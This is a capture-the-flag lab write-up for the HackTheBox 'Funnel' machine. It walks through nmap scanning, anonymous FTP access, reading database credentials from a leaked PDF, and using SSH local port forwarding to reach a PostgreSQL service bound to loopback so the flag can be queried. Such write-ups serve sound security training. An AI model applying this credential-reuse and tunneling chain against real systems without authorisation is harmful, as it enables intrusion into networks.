@@ -1,0 +1,213 @@
+---
+title: "Starting Point: Tier 1 Walkthrough"
+description: "Walkthrough and solutions for HackTheBox Starting Point Tier 1 machines, featuring Funnel (FTP, SSH Port Forwarding, PostgreSQL)."
+date: "2026-11-04"
+difficulty: "Very Easy"
+points: "150"
+published: true
+---
+
+# Starting Point: Tier 1 Walkthrough
+
+This page documents walkthroughs and methodologies for machines in **Tier 1** of HackTheBox Starting Point. Tier 1 expands into multi-service pivoting, local port forwarding, and database exploitation.
+
+<Callout type="info" title="Tier 1 In Progress">
+This writeup begins with **Funnel**. More Tier 1 machine solutions will be documented on this page as I complete them.
+</Callout>
+
+---
+
+## 1. Funnel
+
+Funnel demonstrates the danger of anonymous FTP file leaks, discovering internal-only network services bound to `127.0.0.1`, and leveraging SSH local port forwarding to pivot into an otherwise unreachable PostgreSQL database.
+
+- **Target services:** FTP (`21/tcp`), PostgreSQL (`5432/tcp`), SSH (`22/tcp`)
+- **Key vulnerability & attack chain:**
+  1. FTP allows anonymous login and exposes a welcome PDF containing database credentials.
+  2. PostgreSQL is bound exclusively to `127.0.0.1` (loopback) on the target, preventing direct remote connections.
+  3. SSH local port forwarding (`-L`) creates an encrypted tunnel from the local machine through the remote host directly to the internal PostgreSQL daemon.
+
+---
+
+### Enumeration
+
+Perform an initial comprehensive service scan:
+
+```bash
+nmap -sV -sC <TARGET_IP>
+```
+
+Check FTP specifically for version information and default scripts:
+
+```bash
+nmap -p 21 -sV -sC <TARGET_IP>
+```
+
+Test for anonymous FTP access:
+
+```bash
+ftp <TARGET_IP>
+```
+
+When prompted for credentials, use `anonymous`:
+
+```text
+Name: anonymous
+Password: anonymous
+```
+
+---
+
+### FTP Information Gathering
+
+Once authenticated to the FTP server, list files in the current directory:
+
+```ftp
+ls
+pwd
+```
+
+Download the interesting `welcome.pdf` file:
+
+```ftp
+get welcome.pdf
+bye
+```
+
+Extract and read the text from the downloaded PDF:
+
+```bash
+pdftotext welcome.pdf -
+```
+
+The PDF contains administrative orientation notes revealing database credentials:
+
+```text
+Username: christine
+Password: funnel123#!#
+```
+
+---
+
+### Local Service Discovery
+
+Checking the target's listening ports (via an initial shell or SSH session):
+
+```bash
+ss -tulnp
+```
+
+Filter specifically for PostgreSQL's default port (`5432`):
+
+```bash
+ss -tulnp | grep :5432
+```
+
+Command output:
+
+```text
+tcp LISTEN 0 4096 127.0.0.1:5432 0.0.0.0:*
+```
+
+<Callout type="warning" title="Loopback Binding Explained">
+The address `127.0.0.1:5432` confirms PostgreSQL is running, but listening strictly on the host's loopback interface. Direct remote connections to `<TARGET_IP>:5432` will be rejected by the TCP stack. We need a tunnel.
+</Callout>
+
+---
+
+### SSH Local Port Forwarding
+
+Using the credentials obtained earlier, establish an SSH connection with a local port forward:
+
+```bash
+ssh -L 5433:127.0.0.1:5432 christine@<TARGET_IP>
+```
+
+*Keep this SSH terminal session open to maintain the tunnel active.*
+
+<Callout type="tip" title="Port Forwarding Syntax Breakdown">
+```text
+ssh -L [LOCAL_BIND_PORT]:[DESTINATION_HOST]:[DESTINATION_PORT] user@gateway
+```
+- `-L`: Specifies a local port forward.
+- `5433`: The local port opened on your attacking machine (using 5433 avoids collisions if local PostgreSQL is running on 5432).
+- `127.0.0.1`: The host to reach from the perspective of the SSH server (`funnel`).
+- `5432`: The target service port on that remote host.
+- Any traffic sent to `localhost:5433` on your machine is now securely tunneled over SSH and delivered directly to `127.0.0.1:5432` on the target.
+</Callout>
+
+---
+
+### Connecting to PostgreSQL via the Tunnel
+
+In a separate terminal on your attacking machine, connect to PostgreSQL pointing at your local forwarded port:
+
+```bash
+psql -h 127.0.0.1 -p 5433 -U christine -d postgres
+```
+
+Enter the password when prompted:
+
+```text
+funnel123#!#
+```
+
+---
+
+### Database Enumeration & Flag Extraction
+
+Once inside the PostgreSQL interactive prompt:
+
+List all databases:
+
+```sql
+\l
+```
+
+Connect to the relevant database:
+
+```sql
+\c database_name
+```
+
+List tables in the current schema:
+
+```sql
+\dt
+```
+
+List tables across all schemas (including hidden or system schemas):
+
+```sql
+\dt *.*
+```
+
+Check current user context:
+
+```sql
+SELECT current_user;
+```
+
+Check current database context:
+
+```sql
+SELECT current_database();
+```
+
+Query the table containing sensitive data / flags:
+
+```sql
+SELECT * FROM secrets;
+```
+
+Extract the flag and submit it on HackTheBox!
+
+![Funnel Pwned — 150 XP Earned](/images/writeups/hackthebox/funnel-solved.png)
+
+---
+
+## Lessons Learned
+
+- **Anonymous FTP is a critical reconnaissance vector**: Always check for publicly accessible documents, configuration backups, and notes that may disclose credentials.
+- **Port binding matters**: If a port scan doesn't reveal expected services, inspect `ss -tulnp` on any compromised host to locate internal services bound to loopback.
+- **Master SSH port forwarding**: SSH tunneling (`-L`, `-R`, and `-D`) is an essential technique for bypassing perimeter firewalling and reaching isolated internal resources.
